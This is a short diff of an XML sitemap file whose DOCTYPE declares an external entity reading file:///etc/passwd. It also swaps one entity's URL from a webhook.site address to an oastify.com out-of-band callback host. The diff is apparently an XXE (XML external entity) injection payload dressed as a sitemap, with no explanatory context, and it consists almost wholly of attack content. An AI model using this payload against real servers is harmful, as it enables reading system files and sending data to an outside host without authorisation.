@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE urlset [
-<!ENTITY test "https://webhook.site/7b02ae7d-04b1-416d-b7e0-26a61298ef20"> 
+<!ENTITY test "http://rd8w7ydbwd9qhomwzrnffxiqahg84zso.oastify.com"> 
 <!ENTITY file SYSTEM "file:///etc/passwd">
 ]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
